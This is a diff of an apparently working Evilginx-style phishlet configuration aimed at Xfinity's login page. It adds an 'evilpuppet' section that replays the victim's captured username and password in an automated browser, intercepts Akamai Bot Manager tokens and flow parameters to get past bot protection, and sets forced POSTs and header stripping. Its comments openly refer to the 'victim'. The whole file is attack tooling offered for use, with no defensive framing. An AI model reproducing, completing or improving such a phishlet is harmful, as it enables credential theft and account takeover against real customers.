@@ -1,6 +1,6 @@
 min_ver: '3.0.0'
 
-# Xfinity Phishlet - Updated for current Akamai Bot Manager
+# Xfinity Phishlet with Evilpuppet for Akamai Bot Manager bypass
 # January 2026 version
 
 proxy_hosts:
@@ -67,10 +67,113 @@ credentials:
       page: '/login'
 
 # ============================================
-# CRITICAL FIXES FOR AKAMAI BYPASS
+# EVILPUPPET CONFIGURATION FOR AKAMAI BYPASS
 # ============================================
 
-# 1. Allow all Akamai Bot Manager parameters to pass through
+evilpuppet:
+  triggers:
+    # Trigger 1: When user submits email (first step)
+    - id: 'xfinity_email'
+      enabled: true
+      domains: ['login.xfinity.com']
+      paths: ['/login']
+      tokens: ['X-hzfdeCEGvt-a', 'X-hzfdeCEGvt-z', 'X-hzfdeCEGvt-d', 'X-hzfdeCEGvt-c', 'X-hzfdeCEGvt-b', 'X-hzfdeCEGvt-f']
+      auto_activate: true
+      open_url: 'https://login.xfinity.com/login'
+      actions:
+        # Wait for page to load
+        - selector: 'body'
+          click: false
+          post_wait: 2000
+        # Accept cookies if popup appears
+        - selector: '#truste-consent-button, .accept-cookies, [aria-label="Accept Cookies"]'
+          click: true
+          post_wait: 1000
+        # Enter the email that victim entered
+        - selector: 'input[name="user"], #user, input[type="email"]'
+          value: '{username}'
+          enter: false
+          click: false
+          post_wait: 500
+        # Click the submit/continue button
+        - selector: 'button[type="submit"], #continue, .btn-primary, [data-testid="submit-button"]'
+          click: true
+          post_wait: 3000
+        # Wait for password page to load
+        - selector: 'input[name="passwd"], #passwd, input[type="password"]'
+          click: false
+          post_wait: 2000
+      
+    # Trigger 2: When user submits password (second step)
+    - id: 'xfinity_password'
+      enabled: true
+      domains: ['login.xfinity.com']
+      paths: ['/login']
+      tokens: ['X-hzfdeCEGvt-a', 'X-hzfdeCEGvt-z', 'X-hzfdeCEGvt-d', 'X-hzfdeCEGvt-c', 'X-hzfdeCEGvt-b', 'X-hzfdeCEGvt-f']
+      auto_activate: false
+      open_url: ''
+      actions:
+        # We're already on password page from previous step
+        # Enter the password that victim entered
+        - selector: 'input[name="passwd"], #passwd, input[type="password"]'
+          value: '{password}'
+          enter: false
+          click: false
+          post_wait: 500
+        # Check "Remember me" if present
+        - selector: 'input[name="rememberMe"], #rememberMe, [type="checkbox"]'
+          click: true
+          post_wait: 500
+        # Click the sign in button
+        - selector: 'button[type="submit"], #sign_in, .sign-in-button'
+          click: true
+          post_wait: 5000
+
+  interceptors:
+    # Interceptor for email submission tokens
+    - token: 'X-hzfdeCEGvt-a'
+      url_re: '^https://login\.xfinity\.com/login.*'
+      post_re: 'X-hzfdeCEGvt-a=([^&]*)'
+      abort: true
+    - token: 'X-hzfdeCEGvt-z'
+      url_re: '^https://login\.xfinity\.com/login.*'
+      post_re: 'X-hzfdeCEGvt-z=([^&]*)'
+      abort: true
+    - token: 'X-hzfdeCEGvt-d'
+      url_re: '^https://login\.xfinity\.com/login.*'
+      post_re: 'X-hzfdeCEGvt-d=([^&]*)'
+      abort: true
+    - token: 'X-hzfdeCEGvt-c'
+      url_re: '^https://login\.xfinity\.com/login.*'
+      post_re: 'X-hzfdeCEGvt-c=([^&]*)'
+      abort: true
+    - token: 'X-hzfdeCEGvt-b'
+      url_re: '^https://login\.xfinity\.com/login.*'
+      post_re: 'X-hzfdeCEGvt-b=([^&]*)'
+      abort: true
+    - token: 'X-hzfdeCEGvt-f'
+      url_re: '^https://login\.xfinity\.com/login.*'
+      post_re: 'X-hzfdeCEGvt-f=([^&]*)'
+      abort: true
+    
+    # Also intercept the flow parameters
+    - token: 'flowId'
+      url_re: '^https://login\.xfinity\.com/login.*'
+      post_re: 'flowId=([^&]*)'
+      abort: false
+    - token: 'flowStateId'
+      url_re: '^https://login\.xfinity\.com/login.*'
+      post_re: 'flowStateId=([^&]*)'
+      abort: false
+    - token: 'flowStep'
+      url_re: '^https://login\.xfinity\.com/login.*'
+      post_re: 'flowStep=([^&]*)'
+      abort: false
+
+# ============================================
+# FORCE POST CONFIGURATION (COMPLEMENTARY)
+# ============================================
+
 force_post:
   # First POST (email submission)
   - path: /login
@@ -103,33 +206,10 @@ force_post:
       - {key: 'rememberMe', value: 'pass'}
     type: 'post'
 
-# 2. Remove problematic js_inject section (simplify for now)
-# js_inject:
-#   - trigger_domains: ["login.xfinity.com"]
-#     trigger_paths: ["/login"]
-#     trigger_params: ["flowStep=username"]
-#     script: |
-#       // Force proper form submission
-#       document.addEventListener('DOMContentLoaded', function() {
-#         var forms = document.querySelectorAll('form');
-#         forms.forEach(function(form) {
-#           form.addEventListener('submit', function(e) {
-#             // Ensure all hidden fields are preserved
-#             var hiddenFields = form.querySelectorAll('input[type="hidden"]');
-#             hiddenFields.forEach(function(field) {
-#               if (!field.value || field.value === '') {
-#                 // Clone from original if empty
-#                 var origField = document.querySelector('[name="' + field.name + '"]');
-#                 if (origField && origField.value) {
-#                   field.value = origField.value;
-#                 }
-#               }
-#             });
-#           });
-#         });
-#       });
+# ============================================
+# LOGIN DETECTION
+# ============================================
 
-# 3. Configure login detection
 login:
   domain: 'login.xfinity.com'
   path: '/login'
@@ -141,10 +221,9 @@ login:
       conditional: true
 
 # ============================================
-# ADDITIONAL CONFIGURATION FOR BOT PROTECTION
+# HEADERS CONFIGURATION
 # ============================================
 
-# Set proper headers to mimic real browser
 headers:
   remove:
     - 'X-Forwarded-For'
